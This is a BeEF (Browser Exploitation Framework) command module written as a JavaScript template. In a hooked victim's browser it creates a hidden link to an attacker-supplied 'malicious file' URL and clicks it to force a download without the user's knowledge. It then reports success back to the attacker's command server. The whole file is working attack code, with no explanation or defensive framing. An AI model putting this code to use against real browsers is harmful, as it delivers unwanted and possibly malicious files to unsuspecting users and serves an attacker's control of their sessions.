beef.execute(function() {	
	var maliciousurl = '<%= @malicious_file_uri %>';
	var w;

	function downloadFile() {
		// Create a hidden anchor tag for download
		var a = document.createElement('a');
		a.href = maliciousurl;
		a.download = '';
		a.style.display = 'none';
		document.body.appendChild(a);
		a.click();
		document.body.removeChild(a);
	}

	downloadFile();
	beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Malicious file triggered for download");
});
